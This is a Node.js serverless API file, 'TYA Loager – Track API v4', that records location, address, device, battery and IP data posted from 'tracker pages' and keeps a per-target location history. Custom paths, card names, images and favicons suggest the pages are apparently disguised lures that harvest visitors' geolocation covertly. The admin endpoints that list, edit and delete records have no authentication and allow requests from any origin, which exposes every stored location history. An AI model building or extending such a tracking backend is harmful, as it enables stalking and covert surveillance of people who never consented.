/* ──────────────────────────────────────────────
   TYA Loager – Track API v4
   Full CRUD · Location History · Soft/Perm Delete
   ────────────────────────────────────────────── */
const store = require('./_store');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const users = store.users;

  /* ── GET ── list users */
  if (req.method === 'GET') {
    const inclDel = req.query.includeDeleted === 'true';
    const slug = req.query.slug;
    if (slug) {
      const u = users.find(x => (x.customPath === slug || x.id === slug) && !x.deleted);
      return u ? res.json(u) : res.status(404).json({ error: 'not found' });
    }
    return res.json(inclDel ? users : users.filter(u => !u.deleted));
  }

  /* ── POST ── create or update from tracker page */
  if (req.method === 'POST') {
    const b = req.body || {};
    const id = b.id || ('u_' + Math.random().toString(36).slice(2, 10));
    let u = users.find(x => x.id === id || x.customPath === id);

    if (!u) {
      u = {
        id,
        customPath: b.customPath || id,
        cardName: b.cardName || '',
        imageName: b.imageName || '',
        faviconKey: b.faviconKey || '',
        lat: null, lng: null, accuracy: null, source: null,
        address: '', lastAddress: '',
        lastLat: null, lastLng: null,
        device: '', battery: null, ip: '',
        hits: 0, lastUpdate: Date.now(),
        locationHistory: [],
        deleted: false,
        createdAt: Date.now()
      };
      users.push(u);
    }

    // Update location data if provided
    if (b.lat != null && b.lng != null) {
      // Save previous position as last
      if (u.lat != null) {
        u.lastLat = u.lat;
        u.lastLng = u.lng;
        u.lastAddress = u.address || u.lastAddress;
      }

      u.lat = parseFloat(b.lat);
      u.lng = parseFloat(b.lng);
      u.accuracy = b.accuracy != null ? parseFloat(b.accuracy) : u.accuracy;
      u.source = b.source || u.source;
      u.address = b.address || u.address;

      // Record history
      const now = Date.now();
      const wasOffline = u.lastUpdate && (now - u.lastUpdate) > 30000;
      if (wasOffline && u.lastLat != null) {
        u.locationHistory.push({
          lat: u.lastLat, lng: u.lastLng, address: u.lastAddress,
          time: u.lastUpdate, type: 'offline'
        });
      }
      u.locationHistory.push({
        lat: u.lat, lng: u.lng, address: u.address || '',
        time: now, type: 'online'
      });
      // Cap history at 200
      if (u.locationHistory.length > 200) u.locationHistory = u.locationHistory.slice(-200);
    }

    if (b.device) u.device = b.device;
    if (b.battery != null) u.battery = parseInt(b.battery);
    if (b.ip) u.ip = b.ip;
    u.hits = (u.hits || 0) + 1;
    u.lastUpdate = Date.now();
    u.deleted = false; // re-activate if archived

    return res.json({ ok: true, id: u.id, customPath: u.customPath });
  }

  /* ── PUT ── admin edit */
  if (req.method === 'PUT') {
    const b = req.body || {};
    const u = users.find(x => x.id === b.id);
    if (!u) return res.status(404).json({ error: 'not found' });

    if (b.customPath !== undefined) u.customPath = b.customPath;
    if (b.cardName !== undefined) u.cardName = b.cardName;
    if (b.imageName !== undefined) u.imageName = b.imageName;
    if (b.faviconKey !== undefined) u.faviconKey = b.faviconKey;
    if (b.deleted !== undefined) u.deleted = b.deleted;

    return res.json({ ok: true });
  }

  /* ── DELETE ── archive or permanent */
  if (req.method === 'DELETE') {
    const id = req.query.id;
    const perm = req.query.permanent === 'true';
    if (!id) return res.status(400).json({ error: 'id required' });

    if (perm) {
      const idx = users.findIndex(x => x.id === id);
      if (idx !== -1) users.splice(idx, 1);
    } else {
      const u = users.find(x => x.id === id);
      if (u) {
        // Save final location to history before archiving
        if (u.lat != null) {
          u.locationHistory.push({
            lat: u.lat, lng: u.lng, address: u.address || u.lastAddress || '',
            time: Date.now(), type: 'offline'
          });
        }
        u.deleted = true;
      }
    }
    return res.json({ ok: true });
  }

  res.status(405).json({ error: 'method not allowed' });
};
